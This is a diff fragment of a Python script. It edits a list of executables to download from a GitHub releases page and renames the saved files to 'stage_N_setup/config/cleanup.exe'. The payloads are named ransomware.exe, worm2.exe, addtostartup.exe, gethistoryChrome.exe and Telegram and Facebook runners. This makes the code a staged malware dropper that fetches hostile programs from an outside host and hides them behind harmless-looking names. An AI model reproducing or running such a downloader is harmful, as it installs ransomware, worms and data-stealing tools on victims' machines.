@@ -73,27 +73,27 @@ if __name__ == "__main__":
         },
 	{
             "url": "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/latest/download/addtostartup.exe",
-            "filename": "stage_1_setup.exe"
+            "filename": "stage_2_setup.exe"
         },
         {
             "url": "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/latest/download/gethistoryChrome.exe",
-            "filename": "stage_1_setup.exe"
+            "filename": "stage_3_setup.exe"
         },
         {
             "url": "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/latest/download/facebookrun.exe", 
-            "filename": "stage_2_config.exe"
+            "filename": "stage_4_config.exe"
         },
         {
             "url": "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/latest/download/Telegramrun.exe",
-            "filename": "stage_3_cleanup.exe"
+            "filename": "stage_5_cleanup.exe"
         },
 		{
             "url": "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/latest/download/ransomware.exe",
-            "filename": "stage_3_cleanup.exe"
+            "filename": "stage_6_cleanup.exe"
         },
 		{
             "url": "https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/latest/download/worm2.exe",
-            "filename": "stage_3_cleanup.exe"
+            "filename": "stage_7_cleanup.exe"
         }
     ]
     
